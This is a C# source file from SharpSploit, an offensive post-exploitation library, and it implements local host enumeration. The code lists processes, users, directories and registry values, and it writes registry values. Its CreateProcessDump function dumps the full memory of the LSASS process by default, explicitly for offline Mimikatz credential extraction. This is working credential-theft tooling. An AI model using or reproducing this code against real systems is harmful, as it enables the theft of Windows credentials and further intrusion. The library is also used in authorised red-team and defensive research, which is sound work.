// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using Microsoft.Win32;

using SharpSploit.Generic;

namespace SharpSploit.Enumeration
{
    /// <summary>
    /// Host is a library for local host enumeration.
    /// </summary>
    public class Host
    {
        /// <summary>
        /// Gets a list of running processes on the system.
        /// </summary>
        /// <returns>List of ProcessResults.</returns>
        public static SharpSploitResultList<ProcessResult> GetProcessList()
        {
			Process[] processes = Process.GetProcesses();
            SharpSploitResultList<ProcessResult> results = new SharpSploitResultList<ProcessResult>();
			foreach (Process process in processes)
			{
                results.Add(new ProcessResult(process.Id, 0, process.ProcessName));
			}
            return results;
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="processId">Process ID of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static void CreateProcessDump(int processId, string outputPath = "", string outputFileName = "")
        {
            CreateProcessDump(Process.GetProcessById(processId), outputPath, outputFileName);
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="processName">Name of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static void CreateProcessDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
        {
            if (processName.EndsWith(".exe"))
            {
                processName = processName.Substring(0, processName.Length - 4);
            }
            Process[] process_list = Process.GetProcessesByName(processName);
            if (process_list.Length > 0)
            {
                CreateProcessDump(process_list[0], outputPath, outputFileName);
            }
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="process">Process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static void CreateProcessDump(Process process, string outputPath = "", string outputFileName = "")
        {
            if (outputPath == "" || outputPath == null)
            {
                outputPath = GetCurrentDirectory();
            }
            if (outputFileName == "" || outputFileName == null)
            {
                outputFileName = process.ProcessName + "_" + process.Id + ".dmp";
            }
            
            string fullPath = Path.Combine(outputPath, outputFileName);
            FileStream fileStream = File.Create(fullPath);
            bool success = false;
            try
            {
                success = Execution.Win32.Dbghelp.MiniDumpWriteDump(process.Handle, (uint)process.Id, fileStream.SafeFileHandle, Execution.Win32.Dbghelp.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            catch (System.ComponentModel.Win32Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }

            fileStream.Close();
            if (!success)
            {
                File.Delete(fullPath);
            }
        }

        /// <summary>
        /// Gets the hostname of the system.
        /// </summary>
        /// <returns>Hostname of the system.</returns>
        public static string GetHostname()
		{
			return Environment.MachineName;
		}

        /// <summary>
        /// Gets the Domain name and username of the current logged on user.
        /// </summary>
        /// <returns>Current username.</returns>
        public static string GetUsername()
		{
			return Environment.UserDomainName + "\\" + Environment.UserName;
		}

        /// <summary>
        /// Gets the full path of the current working directory.
        /// </summary>
        /// <returns>Current working directory.</returns>
        public static string GetCurrentDirectory()
		{
			return Directory.GetCurrentDirectory();
		}

        /// <summary>
        /// Gets a directory listing of the current working directory.
        /// </summary>
        /// <returns>List of FileSystemEntryResults.</returns>
		public static SharpSploitResultList<FileSystemEntryResult> GetDirectoryListing()
		{
            SharpSploitResultList<FileSystemEntryResult> results = new SharpSploitResultList<FileSystemEntryResult>();
			foreach (string dir in Directory.GetDirectories(GetCurrentDirectory()))
			{
                results.Add(new FileSystemEntryResult(dir));
			}
            foreach (string file in Directory.GetFiles(GetCurrentDirectory()))
            {
                results.Add(new FileSystemEntryResult(file));
            }
            return results;
		}

        /// <summary>
        /// Changes the current directory by appending a specified string to the current working directory.
        /// </summary>
        /// <param name="AppendDirectory">String to append to the current directory.</param>
        public static void ChangeCurrentDirectory(string AppendDirectory)
		{
			Directory.SetCurrentDirectory(GetCurrentDirectory() + "\\" + AppendDirectory);
		}

        /// <summary>
        /// Reads a value stored in registry.
        /// </summary>
        /// <param name="RegPath">The full path to the registry value to be read.</param>
        /// <returns></returns>
        public static string RegistryRead(string RegPath)
        {
            var split = RegPath.Split(Path.DirectorySeparatorChar);
            string valueName = split[split.Length - 1];
            string keyName = RegPath.Substring(0, RegPath.IndexOf(valueName));
            return RegistryRead(keyName, valueName);
        }

        /// <summary>
        /// Reads a value stored in registry.
        /// </summary>
        /// <param name="RegKey">The RegistryKey to read from.</param>
        /// <param name="RegValue">The name of name/value pair to read from in the RegistryKey.</param>
        /// <returns></returns>
        public static string RegistryRead(string RegKey, string RegValue)
        {
            try
            {
                object reg = Registry.GetValue(RegKey, RegValue, null);
                if (reg == null)
                {
                    return null;
                }
                return reg.ToString();
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Registry read exception: " + e.Message);
                return null;
            }
        }

        /// <summary>
        /// Writes a value in the registry.
        /// </summary>
        /// <param name="RegPath">The full path to the registry value to be written to.</param>
        /// <param name="Value">The value to write to the registry key.</param>
        /// <returns></returns>
        public static bool RegistryWrite(string RegPath, object Value)
        {
            var split = RegPath.Split(Path.DirectorySeparatorChar);
            string valueName = split[split.Length - 1];
            string keyName = RegPath.Substring(0, RegPath.IndexOf(valueName));
            return RegistryWrite(keyName, valueName, Value);
        }

        /// <summary>
        /// Writes a value in the registry.
        /// </summary>
        /// <param name="RegKey">The RegistryKey to read from.</param>
        /// <param name="RegValue">The name of name/value pair to read from in the RegistryKey.</param>
        /// <param name="Value">The value to write to the registry key.</param>
        /// <returns></returns>
        public static bool RegistryWrite(string RegKey, string RegValue, object Value)
        {
            try
            {
                Registry.SetValue(RegKey, RegValue, Value);
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Registry write exception: " + e.Message);
                return false;
            }
        }

        /// <summary>
        /// ProcessResult represents a running process, used with the GetProcessList() function.
        /// </summary>
        public sealed class ProcessResult : SharpSploitResult
        {
            public int Pid { get; } = 0;
            public int Ppid { get; } = 0;
            public string Name { get; } = "";
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty>
                    {
                        new SharpSploitResultProperty
                        {
                            Name = "Pid",
                            Value = this.Pid
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "Ppid",
                            Value = this.Ppid
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "Name",
                            Value = this.Name
                        }
                    };
                }
            }

            public ProcessResult(int Pid = 0, int Ppid = 0, string Name = "")
            {
                this.Pid = Pid;
                this.Ppid = Ppid;
                this.Name = Name;
            }
        }

        /// <summary>
        /// FileSystemEntryResult represents a file on disk, used with the GetDirectoryListing() function.
        /// </summary>
        public sealed class FileSystemEntryResult : SharpSploitResult
        {
            public string Name { get; } = "";
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty>
                    {
                        new SharpSploitResultProperty
                        {
                            Name = "Name",
                            Value = this.Name
                        }
                    };
                }
            }

            public FileSystemEntryResult(string Name = "")
            {
                this.Name = Name;
            }
        }
    }
}
